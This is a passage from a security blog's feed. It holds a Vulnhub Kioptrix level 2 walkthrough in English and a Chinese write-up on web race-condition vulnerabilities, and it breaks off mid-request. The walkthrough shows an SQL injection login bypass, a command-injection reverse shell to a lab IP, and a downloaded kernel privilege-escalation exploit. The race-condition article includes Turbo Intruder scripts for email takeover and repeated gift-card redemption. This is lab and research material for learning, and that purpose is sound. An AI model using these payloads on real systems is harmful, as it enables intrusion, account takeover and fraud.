worked!</p><p>Another:</p><p><img src="/2023/04/27/file-upload/trix_level_4/image-20231107144733073.png" alt="image-20231107144733073"></p><p>ROOT it!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-Kioptrix_level_2</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_2/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_2/</url>
    
    <content type="html"><![CDATA[<h3 id="Vulnhub-Kioptrix-level-2"><a href="#Vulnhub-Kioptrix-level-2" class="headerlink" title="Vulnhub-Kioptrix_level_2"></a>Vulnhub-Kioptrix_level_2</h3><p>Default network connectivity of this machine is BRIDGE. I prefer using the NAT mode, however, I encountered an issue when attempting to modify the settings: after changing to NAT, upon restarting, it automatically switches back to BRIDGE mode.</p><p>Here are the solutions:</p><ul><li>Remove the network adapter.</li><li>Delete all lines in the vmx file that start with ethernet0.</li><li>Add a network adapter and select NAT mode.</li></ul><p>OK, Let’s begin our journey of penetration test !</p><p>Let us start with port scan and servece detection.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001655079.png" alt="image-20231104001655079"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104001708692.png" alt="image-20231104001708692"></p><p>What captures my interest most is HTTP service running on port 80. Just move forward and check it with dirsearch and nikto etc.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002346009.png" alt="image-20231104002346009"></p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002355341.png" alt="image-20231104002355341"></p><p>Unfortunately, there is no information available that helps me go ahead.</p><p>So , I seek for the most direct approach and access port 80 by firefox:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104002812613.png" alt="image-20231104002812613"></p><p>What comes to me firstly and strongly is SQL INJECTION. I tried to fill the blank with <code>admin’ or 1=1 —</code> <code>123456</code>. Unbelievably , I directly accessed the backend , bypassing the limitation of admin panel.</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104003451499.png" alt="image-20231104003451499"></p><p>Following is a classic PING functionality, where command injection comes to mind quite easy.</p><p>When I input 127.0.0.1:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104092922931.png" alt="image-20231104092922931"></p><p>PING command executed successfully as expected and I received correct response.</p><p>Then I turned to id command:</p><p><img src="/2023/04/27/file-upload/trix_level_2/image-20231104093617893.png" alt="image-20231104093617893"></p><p>Got it! Now we can be sure that command injection can be performed over here. Through the same method we can gain a reverse shell as well by sending a command to create a reverse shell:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>; sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.122.111</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>At the same time, I recerved a bash shell successfully on my attack machine:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">──(root㉿kali)-[~/Desktop/vulnhub/kioptrix_2]<br>└─# nc -nlvp 4444<br>listening on [any] 4444 <span class="hljs-built_in">..</span>.<br>connect <span class="hljs-keyword">to</span> [192.168.122.111] <span class="hljs-keyword">from</span> (UNKNOWN) [192.168.122.13] 32789<br>sh: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>sh-3.00$ id<br><span class="hljs-attribute">uid</span>=48(apache) <span class="hljs-attribute">gid</span>=48(apache) <span class="hljs-attribute">groups</span>=48(apache)<br>sh-3.00$<br></code></pre></td></tr></table></figure><p>The preliminary step I undertake is uploading LINPEAS to seek for potential vulnerabilities that can be exploited.</p><p>We ought to initate a python http server on our machine, and then proceed to download linpeas onto the target machine using the wget command for subsequent execution.</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less">══════════════════════════════╣ <span class="hljs-selector-tag">System</span> <span class="hljs-selector-tag">Information</span> ╠══════════════════════════════                                                                                                                                <br>                              ╚════════════════════╝                                                                                                                                                              <br>╔══════════╣ <span class="hljs-selector-tag">Operative</span> <span class="hljs-selector-tag">system</span><br>╚ <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                </span><br><span class="hljs-selector-tag">Linux</span> <span class="hljs-selector-tag">version</span> <span class="hljs-number">2.6</span><span class="hljs-selector-class">.9-55</span><span class="hljs-selector-class">.EL</span> (mockbuild<span class="hljs-variable">@builder6</span>.centos.org) (gcc version <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span> <span class="hljs-number">20060404</span> (Red Hat <span class="hljs-number">3.4</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span>)) <span class="hljs-selector-id">#1</span> <span class="hljs-selector-tag">Wed</span> <span class="hljs-selector-tag">May</span> <span class="hljs-number">2</span> <span class="hljs-number">13</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> <span class="hljs-selector-tag">EDT</span> <span class="hljs-number">2007</span>                                                                           <br><span class="hljs-selector-tag">LSB</span> <span class="hljs-selector-tag">Version</span>:    :<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">core-3</span><span class="hljs-selector-class">.0-noarch</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-ia32</span>:<span class="hljs-selector-tag">graphics-3</span><span class="hljs-selector-class">.0-noarch</span><br><span class="hljs-selector-tag">Distributor</span> <span class="hljs-selector-tag">ID</span>: <span class="hljs-selector-tag">CentOS</span><br><span class="hljs-selector-tag">Description</span>:    <span class="hljs-selector-tag">CentOS</span> <span class="hljs-selector-tag">release</span> <span class="hljs-number">4.5</span> (Final)<br><span class="hljs-selector-tag">Release</span>:        <span class="hljs-number">4.5</span><br><span class="hljs-selector-tag">Codename</span>:       <span class="hljs-selector-tag">Final</span><br></code></pre></td></tr></table></figure><p>Upon inspecting the system information section, it has been determined that the version identified is 2.6.9, specifically CentOS.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kali)</span>-[~<span class="hljs-string">/Desktop/vulnhub/kioptrix_2</span>]<br>└─<span class="hljs-comment"># searchsploit centos 2.6.9             </span><br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br> Exploit Title                                                                                                                                                                  |  Path<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Linux Kernel 2.6 &lt; 2.6.19 <span class="hljs-params">(White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)</span> - &#x27;ip_append_data<span class="hljs-params">()</span>&#x27; Ring0 Privilege Escalation <span class="hljs-params">(1)</span>                                            | linux_x86/local/9542.c<br><span class="hljs-params">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="hljs-params">---------------------------------</span><br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>Returning to the searchsploit once again, we can easily find an exploit for privilege escalation.</p><p>The final step is uploading the script to the target machine, compiling it, executing it, and then achieving a successful privilege escalation.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">bash-3.00$ wget http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c -O <span class="hljs-string">/tmp/exp.c</span><br><span class="hljs-params">--01</span><span class="hljs-function">:35</span><span class="hljs-function">:39--</span>  http:<span class="hljs-string">//192.168.122.111</span><span class="hljs-function">:8080</span>/9542.c<br>           =&gt; `<span class="hljs-string">/tmp/exp.c</span>&#x27;<br>Connecting to 192.168.122.111<span class="hljs-function">:8080...</span> connected.<br>HTTP request sent, awaiting response.<span class="hljs-string">..</span> 200 OK<br>Length: 2,535 <span class="hljs-params">(2.5K)</span> [text/x-csrc]<br><br>    0K <span class="hljs-string">..</span>                                                    100%   36.08 MB/s<br><br>01<span class="hljs-function">:35</span><span class="hljs-function">:39</span> <span class="hljs-params">(36.08 MB/s)</span> - `<span class="hljs-string">/tmp/exp.c</span>&#x27; saved [2535/2535]<br><br>bash-3.00$ <span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>bash-3.00$ gcc -o exp exp.c &amp;&amp; <span class="hljs-string">./exp</span><br>exp.c<span class="hljs-function">:109</span><span class="hljs-function">:28</span>: warning: no newline at end of file<br>sh: no job control in this shell<br>sh-3.00<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>All-in-One—条件竞争漏洞</title>
    <link href="/2024/07/23/race_condition/"/>
    <url>/2024/07/23/race_condition/</url>
    
    <content type="html"><![CDATA[<h1 id="All-in-One—条件竞争漏洞"><a href="#All-in-One—条件竞争漏洞" class="headerlink" title="All-in-One—条件竞争漏洞"></a>All-in-One—条件竞争漏洞</h1><p>今天在逛medium的时候，发现《Smashing the state machine: the true potential of web race conditions》还是反复被提及，因此打算写一篇文章，结合james-kettle介绍的内容和一些hackerone的案例，来把条件竞争漏洞做一个总结。</p><h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><p>当网站在没有足够保护措施的情况下同时处理请求时，就可能会产生条件竞争漏洞，这可能会导致多个不同的线程同时与相同的数据交互，从而导致冲突，出现意想不到的结果。</p><p>例如在领取优惠券时，通过条件竞争可能能够领取多张，引用一张portswigger的图如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422093942199.png" alt="image-20240422093942199"></p><h2 id="Smashing-the-state-machine-the-true-potential-of-web-race-conditions（粉碎状态机：条件竞争漏洞的真正潜力）"><a href="#Smashing-the-state-machine-the-true-potential-of-web-race-conditions（粉碎状态机：条件竞争漏洞的真正潜力）" class="headerlink" title="Smashing the state machine: the true potential of web race conditions（粉碎状态机：条件竞争漏洞的真正潜力）"></a>Smashing the state machine: the true potential of web race conditions（粉碎状态机：条件竞争漏洞的真正潜力）</h2><p>说完什么是条件竞争漏洞，接下来简单介绍一下关于这个漏洞最知名的一篇文章《Smashing the state machine: the true potential of web race conditions》，也可以直接去youtube观看相关视频：<a href="https://youtu.be/tKJzsaB1ZvI">https://youtu.be/tKJzsaB1ZvI</a></p><p>“The true potential of race conditions can be summed up in a single sentence. Every pentester knows that multi-step sequences are a hotbed for vulnerabilities, but <em>with race conditions, everything is multi-step</em>.”</p><p>文中提到，multi-step是最可能出现漏洞的，而对于条件竞争来说，一切都是multi-step。</p><h3 id="条件竞争的真正潜力"><a href="#条件竞争的真正潜力" class="headerlink" title="条件竞争的真正潜力"></a>条件竞争的真正潜力</h3><p>有如下一个场景，用户登录时，需要选择角色，其中包含一系列请求：分配角色，重定向到应用等等，请求包如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /<span class="hljs-keyword">login</span><span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">role</span>   <span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br>POST /<span class="hljs-keyword">role</span> <span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">GET</span>  /application<span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure><p>用状态机来表示的话，大致如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422100352165.png" alt="image-20240422100352165"></p><p>这里的目标是要获取更高的权限，首先尝试不选择角色，强制从角色选择的界面直接跳转到&#x2F;application页，失败。</p><p>这并非说明此处是安全的，因为作者在第一次尝试时，认为GET &#x2F;role的请求并不会更改应用的状态，而实际上，应用会使用管理员权限来初始化每个会话，然后在浏览器获取角色选择界面之后立即进行覆盖，修改后的状态机如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422101347657.png" alt="image-20240422101347657"></p><p>首先是null，在登录之后，变为admin(初始化会话)，进入角色选择界面，变为pending(待定)，再进行角色选择，最终变成staff(员工).</p><p>如果跳过GET &#x2F;role，也就是不去重定向到&#x2F;role界面，直接跳转到应用中，就能获得管理员权限。</p><h3 id="Single-packet-attack"><a href="#Single-packet-attack" class="headerlink" title="Single-packet attack"></a>Single-packet attack</h3><p>子状态(sub-state)是一种很短暂的状态，在应用程序处理单个请求时进行转换，并且在请求完成之前退出。子状态一般只会占用很短的时间(1ms)。</p><p>要想发现子状态，需要一个初始HTTP请求来触发子状态转换，还需要第二个请求在竞争窗口(race window)期间与同一资源进行交互。</p><p>以前面的场景为例，需要发送一个登录请求，和一个访问管理面板的请求，但是由于网络抖动(jitter)，竞争窗口较小的漏洞也很难被发现，因为抖动会导致TCP数据包的到达时间不规律：</p><p><img src="/2023/04/27/file-upload/on/image-20240422105504066.png" alt="image-20240422105504066"></p><p>所以作者开发出了single-packet attack，可以使20-30个请求同时到达服务器。</p><p>在新版的burp中可以看到该功能：</p><p>将多个数据包发到repeater之后，添加到一个group中即可。</p><p><img src="/2023/04/27/file-upload/on/image-20240422110442445.png" alt="image-20240422110442445"></p><h3 id="预测可能的碰撞"><a href="#预测可能的碰撞" class="headerlink" title="预测可能的碰撞"></a>预测可能的碰撞</h3><p>首先要确定想要绕过的对象，比如用户，会话，还是一些特定的业务，比如订单等等。</p><p>对于每个对象，要了解其写入数据或者读取数据的点。比如，用户可能将注册，配置文件修改，密码重置等数据存储在数据库表中，网站的登录功能也可能会在创建会话时从用户表中读取关键数据。</p><p>条件竞争漏洞需要有“碰撞”——即对共享资源进行两个并发操作。可以通过下面3个问题来排除不太可能受影响的功能点：</p><h4 id="状态如何存储"><a href="#状态如何存储" class="headerlink" title="状态如何存储"></a>状态如何存储</h4><p>存储在服务器端数据结构中的数据非常可能被利用。相反，如果完全存储在客户端，例如通过email发送JWT进行密码重置，这些点基本可以跳过。</p><h4 id="我们是在编辑还是在追加"><a href="#我们是在编辑还是在追加" class="headerlink" title="我们是在编辑还是在追加"></a>我们是在编辑还是在追加</h4><p>编辑现有数据的操作更可能出现问题，例如更改帐户的电子邮件地址，而简单地添加(append)到现有数据的操作则不太可能被攻击，例如添加额外的电子邮件地址。</p><h4 id="这个操作的key是什么"><a href="#这个操作的key是什么" class="headerlink" title="这个操作的key是什么"></a>这个操作的key是什么</h4><p>大多数功能点都是针对特定的key进行操作，这个key可以是用户名，密码重置的令牌，或者是文件名等等。为了成功实施攻击，需要对这个key进行两次操作。</p><p>以下面密码重置的场景为例：</p><p><img src="/2023/04/27/file-upload/on/image-20240422113706946.png" alt="image-20240422113706946"></p><p>第一个情况下，用户的密码重置令牌存储在数据库的用户表中，key为用户的ID，如果攻击者用两个请求同时触发两个不同ID用户的重置密码请求，那么两个不同的数据库记录会被更改，因此不会有冲突。</p><p>在第二个情况下，状态存储在用户session中，并且key为用户的sessionid，如果攻击者使用两个请求同时触发两个密码重置请求，那么两个线程就会尝试更改同一个session的令牌，导致将用户令牌发送给其他用户。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="通过limit-overrun进行对象屏蔽"><a href="#通过limit-overrun进行对象屏蔽" class="headerlink" title="通过limit-overrun进行对象屏蔽"></a>通过limit-overrun进行对象屏蔽</h4><p>这里给出了一个gitlab的对象屏蔽漏洞。gitlab允许通过电子邮件的形式邀请用户去管理项目，用6个请求来进行探测。</p><p>请求如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">POST <span class="hljs-string">/api/</span>…<span class="hljs-string">/invitations</span> HTTP/2<br><span class="hljs-string">...</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;x@psres.net&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>首先按顺序发送这些请求，每个请求之间有一个短暂的延迟。此时收到了6个 {“status”:”success”}和一封邀请的电子邮件。</p><p>下面使用single-packet attack发送请求。收到了1个 {“status”:”success”}和5个{“message”:”The member’s email address has already been taken”}，此时电子邮件变成了两封。</p><p>响应和电子邮件的差异性表明这里存在一个子状态，进一步挖掘之后发现这里确实存在漏洞。利用条件竞争，能够创建一个虚拟的低特权邀请。</p><h4 id="多端点碰撞"><a href="#多端点碰撞" class="headerlink" title="多端点碰撞"></a>多端点碰撞</h4><p>有这样一个购买的场景，可以购买商品，支付费用，并且能够在订单确认页面添加其他商品到购物车里。</p><p>这样的流程最终导致能够免费获得额外商品。</p><p>购买的场景如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422133954809.png" alt="image-20240422133954809"></p><p>同时发送确认订单和添加商品的请求，最终导致额外商品的零元购。</p><p>再说回gitlab的漏洞：</p><p><img src="/2023/04/27/file-upload/on/image-20240422133802048.png" alt="image-20240422133802048"></p><p>如图所示，在验证邮件地址的同时改变地址，是不是就能欺骗gitlab，将错误的邮件标记为已验证？</p><p>在测试时发现，确认的操作每次都在电子邮件更改之前执行，这说明更改邮件的功能点比确认邮件的功能点进行了更多的处理，因此同步发送这两个请求就会错过race window:</p><p><img src="/2023/04/27/file-upload/on/image-20240422134542606.png" alt="image-20240422134542606"></p><p>这里的解决方案是将确认邮件的请求延迟了90ms。</p><p>但是如果存在延迟，就无法使用single-packet attack，这里可以利用常见的安全功能来实现。先发送大量虚拟数据包，触发服务器的速率限制，再通过single-packet attack请求即可。</p><p><img src="/2023/04/27/file-upload/on/image-20240422135034818.png" alt="image-20240422135034818"></p><h4 id="单端点碰撞"><a href="#单端点碰撞" class="headerlink" title="单端点碰撞"></a>单端点碰撞</h4><p>在gitlab中，更改电子邮件的响应时间仅仅为220ms，远快于作者预期，所以猜测电子邮件是由不同的线程发送的。</p><p>下面尝试将邮件地址同时更改两个不同的地址：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">POST /-/profile HTTP/<span class="hljs-number">2</span>Host: gitlab<span class="hljs-selector-class">.com</span><br>user<span class="hljs-selector-attr">[email]</span>=test1@psres<span class="hljs-selector-class">.net</span><br><br>POST /-/profile HTTP/<span class="hljs-number">2</span>Host: gitlab<span class="hljs-selector-class">.com</span><br>user<span class="hljs-selector-attr">[email]</span>=test2@psres.net<br></code></pre></td></tr></table></figure><p>邮件内容如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">To</span>: test2<span class="hljs-symbol">@psres</span>.net<br>Subject: Confirmation instructions<br><br>           test1<span class="hljs-symbol">@psres</span>.net<br><br>Click the link below <span class="hljs-keyword">to</span> confirm your email address.<br><br>        Confirm your email address<br></code></pre></td></tr></table></figure><p>收件地址有时候与正文中的地址并不匹配。而且错误的邮件中令牌是有效的。通过提交两个请求，就能够将邮件改为任意地址，并且不需要进行验证。</p><h2 id="修改邮件地址"><a href="#修改邮件地址" class="headerlink" title="修改邮件地址"></a>修改邮件地址</h2><p>用户attacker已经注册过，并且验证过电子邮件。而victim email没有注册过。</p><p>以attacker用户登录，更改邮件地址，抓包。</p><p>选择邮件地址参数，发送到intruder，更改脚本如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">queueRequests</span>(<span class="hljs-params">target, wordlists</span>):<br><br>    <span class="hljs-comment"># if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack</span><br>    <span class="hljs-comment"># if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead</span><br>    <span class="hljs-comment"># for more information, check out https://portswigger.net/research/smashing-the-state-machine</span><br>    engine = <span class="hljs-title class_">RequestEngine</span>(endpoint=target.endpoint,<br>                        concurrentConnections=<span class="hljs-number">1</span>,<br>                        engine=<span class="hljs-title class_">Engine</span>.<span class="hljs-variable constant_">BURP2</span><br>                        )<br><br>    <span class="hljs-comment"># the &#x27;gate&#x27; argument withholds part of each request until openGate is invoked</span><br>    <span class="hljs-comment"># if you see a negative timestamp, the server responded before the request was complete</span><br>    engine.queue(target.req, <span class="hljs-string">&#x27;victim@example.com&#x27;</span>, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br>    engine.queue(target.req, <span class="hljs-string">&#x27;attacker@example.com&#x27;</span>, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    <span class="hljs-comment"># once every &#x27;race1&#x27; tagged request has been queued</span><br>    <span class="hljs-comment"># invoke engine.openGate() to send them in sync</span><br>    engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">req, interesting</span>):<br>    table.add(req)<br></code></pre></td></tr></table></figure><p>发送之后，发现邮件内容中提到的收件人和实际上是不同的：</p><p><img src="/2023/04/27/file-upload/on/image-20240422142231749.png" alt="image-20240422142231749"></p><p>成功将email改为victim。</p><h2 id="多次兑换礼品卡"><a href="#多次兑换礼品卡" class="headerlink" title="多次兑换礼品卡"></a>多次兑换礼品卡</h2><p>购买礼品卡后兑换，抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fi/redeem</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>sandbox.reverb.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://sandbox.reverb.com/fi/redeem<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>176<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;cookies&gt;<br><br><span class="language-routeros"><span class="hljs-attribute">utf8</span>=%E2%9C%93&amp;authenticity_token=&lt;CSRF token&gt;&amp;<span class="hljs-attribute">token</span>=&lt;GIFT card&gt;&amp;<span class="hljs-attribute">commit</span>=Redeem+Now</span><br></code></pre></td></tr></table></figure><p>发送到intruder，修改脚本如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def queueRequests(target, wordlists):<br>    engine = RequestEngine(<span class="hljs-attribute">endpoint</span>=target.endpoint,<br>                           <span class="hljs-attribute">concurrentConnections</span>=30,<br>                           <span class="hljs-attribute">requestsPerConnection</span>=30,<br>                           <span class="hljs-attribute">pipeline</span>=<span class="hljs-literal">False</span><br>                           )<br><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(30):<br>engine.queue(target.req, i)<br>        engine.queue(target.req, target.baseInput, <span class="hljs-attribute">gate</span>=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br><br>    engine.start(<span class="hljs-attribute">timeout</span>=5)<br>   engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    engine.complete(<span class="hljs-attribute">timeout</span>=60)<br><br><br>def handleResponse(req, interesting):<br>table.<span class="hljs-built_in">add</span>(req)<br></code></pre></td></tr></table></figure><p>成功兑换多次：</p><p><img src="/2023/04/27/file-upload/on/image-20240422145033724.png" alt="image-20240422145033724"></p><h2 id="添加不可删除的组成员"><a href="#添加不可删除的组成员" class="headerlink" title="添加不可删除的组成员"></a>添加不可删除的组成员</h2><p>有两个用户，分别为leader和normal。</p><p>leader账户创建一个group并且创建邀请链接，用normal账户加入group并抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/group/post_join</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ctf.hacker101.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>109<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>COOKIES<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">csrf<span class="hljs-operator">=</span><span class="hljs-number">391</span>aecf<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">3125e90</span><span class="hljs-keyword">c</span><span class="hljs-number">437</span>d<span class="hljs-number">04</span><span class="hljs-keyword">c</span><span class="hljs-number">18204</span>ab<span class="hljs-number">6</span>&amp;invite<span class="hljs-operator">=</span>bb<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">42</span>ab<span class="hljs-number">578</span>b<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">63e5</span>d<span class="hljs-number">868</span>b<span class="hljs-number">3e03816</span><span class="hljs-keyword">c</span><span 